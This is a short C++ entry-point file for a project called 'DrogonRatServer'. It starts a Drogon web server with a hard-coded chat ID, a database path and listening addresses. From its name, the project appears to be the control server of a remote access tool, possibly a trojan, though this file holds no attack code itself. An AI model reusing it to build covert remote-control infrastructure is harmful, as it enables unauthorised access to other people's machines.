#include "DrogonRatServer/Server.hpp"
#include "DrogonRatServer/debug.hpp"

#include <cstdint>
#include <cstdlib>
#include <filesystem>
#include <string>

constexpr int64_t CHAT_ID = 1492536442;
const std::filesystem::path &DB_FILE_PATH =
    std::filesystem::absolute(std::filesystem::current_path() / "data/data.db");

int main() {
    DrogonRatServer::Server server(drogon::app(), DB_FILE_PATH, CHAT_ID);
    server.setIps({"0.0.0.0", "192.168.1.6"}).run();
    return EXIT_SUCCESS;
}
